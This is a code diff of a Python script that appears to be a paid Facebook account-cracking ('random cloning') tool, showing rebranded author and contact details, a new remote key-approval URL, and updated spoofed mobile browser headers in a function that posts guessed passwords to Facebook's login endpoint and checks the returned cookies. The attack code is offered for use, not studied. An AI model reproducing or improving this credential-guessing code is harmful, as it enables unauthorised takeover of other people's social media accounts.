@@ -16,7 +16,7 @@ except ModuleNotFoundError:
     os.system('python run.py')
 import uuid
 import os,sys,time,json,random,re,string,platform,base64
-os.system('xdg-open https://wa.me/93708509223')
+os.system('xdg-open https://w.me/93701659187')
 try:
     import requests
     from concurrent.futures import ThreadPoolExecutor as ThreadPool
@@ -124,26 +124,27 @@ for xd in range(10000):
 
 logo=("""
    
-     █
-  
-    _  ____  _      _  _    
-   / |/  _ \/ \__/|/ \/ \   
-   | || / \|| |\/||| || |   
-/\_| || |-||| |  ||| || |_/\
-\____/\_/ \|\_/  \|\_/\____/
-                            
-
-                                 
-                                 
-  
+     ██╗ █████╗ ███╗   ███╗██╗██╗     
+     ██║██╔══██╗████╗ ████║██║██║     
+     ██║███████║██╔████╔██║██║██║     
+██   ██║██╔══██║██║╚██╔╝██║██║██║     
+╚█████╔╝██║  ██║██║ ╚═╝ ██║██║███████╗
+ ╚════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚══════╝
+                                      
+██╗   ██╗██╗███████╗ █████╗ ██╗       
+██║   ██║██║██╔════╝██╔══██╗██║       
+██║   ██║██║███████╗███████║██║       
+╚██╗ ██╔╝██║╚════██║██╔══██║██║       
+ ╚████╔╝ ██║███████║██║  ██║███████╗  
+  ╚═══╝  ╚═╝╚══════╝╚═╝  ╚═╝╚══════╝  
                      best update
 \x1b[1;92m---------------------------------------------------
-\x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m AUTHOR     \x1b[1;97m: \x1b[1;97mking   
-\x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m FACEBOOK   \x1b[1;97m: \x1b[1;97mking               
+\x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m AUTHOR     \x1b[1;97m: \x1b[1;97mjamil visal   
+\x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m FACEBOOK   \x1b[1;97m: \x1b[1;97mjamil visal               
 \x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m WHATSAPP   \x1b[1;97m: \x1b[1;97m0708509223            
 \x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m STATUS     \x1b[1;97m: \x1b[1;97mRANDOM CLONING 
 \x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m TYPE       \x1b[1;97m: \x1b[1;97mpaid    
-\x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m GITHUB     \x1b[1;97m:\x1b[1;97m king
+\x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m GITHUB     \x1b[1;97m:\x1b[1;97m jamil visal
 \x1b[1;92m|\x1b[1;97m [\x1b[1;97m+\x1b[1;97m]  \x1b[1;97m VERSION    \x1b[1;97m:\x1b[1;97m 0.9         
 \x1b[1;92m----------------------------------------------------    """)
 
@@ -438,21 +439,20 @@ def rcrack(uid,pwx,tl):
             header_freefb = {'authority': 'mbasic.facebook.com',
             "method": 'GET',
             "scheme": 'https',
-             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',
-    'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-    'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"10.0.0"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'none',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': pro,}
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'accept-language': 'en-GB,en;q=0.9,ps-AF;q=0.8,ps;q=0.7,en-US;q=0.6',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
+            'sec-ch-ua-full-version-list': '"Chromium";v="107.0.5304.74", "Not=A?Brand";v="24.0.0.0"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-ch-ua-platform-version': '"10.0.0"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': pro,}
             lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             #print(iid+'|'+pws+'|'+str(log_cookies))
@@ -478,7 +478,7 @@ def approval():
   id = "-".join(uuid)
 
   try:
-    httpCaht = requests.get('https://github.com/Jamilvisal/13/blob/main/Approval.txt').text
+    httpCaht = requests.get('https://github.com/Mafia9370/jamil/blob/main/approval.txt').text
     if id in httpCaht:
       print("\33[1;32m《Hi bro》 YOUR KEY IS APPROVED 《🆁︎🅾︎??︎🅴︎🆇︎ـ🅺︎🅸︎🅽︎🅶︎》.")
       msg = str(os.geteuid())
@@ -494,10 +494,10 @@ def approval():
       print('\33[1;37m----------------------------------------------')
       print ('IF U DONT WANT TO BUY PLS DONT PRESS ENTER')
       input('IF U WANT TO BUY THEN PRESS ENTER ')
-      tks = ('🅷︎🅴︎🅻︎🅻︎🅾︎%2🅹🅰🅼🅸🅻-🅰🅷🅼🅰🅳-🅽︎🅾︎🅾︎🆁︎🆉︎🅰︎🅸︎-🆂︎🅰︎🅷︎🅸︎🅱︎%20!%20🄿lease%20🄰pprove%20🄼y%20🄺ey%20🅃he%20🄺ey%20Is%20:%20'+id);os.system('am start https://wa.me/+93708509223?text='+tks),approval()
+      tks = ('🅷︎🅴︎🅻︎🅻︎🅾︎%20🆁︎🅾︎🅻︎🅴︎🆇︎-🅷︎🅰︎🆀︎🅰︎🅽︎🅸︎-🅽︎🅾︎🅾︎🆁︎🆉︎🅰︎🅸︎-🆂︎🅰︎🅷︎🅸︎🅱︎%20!%20🄿lease%20🄰pprove%20🄼y%20🄺ey%20🅃he%20🄺ey%20Is%20:%20'+id);os.system('am start https://wa.me/+93701659187?text='+tks),approval()
       time.sleep(1)
-      riaz()
+      approval()
   except:
     sys.exit()
-     
-approval()
+    
+riaz()
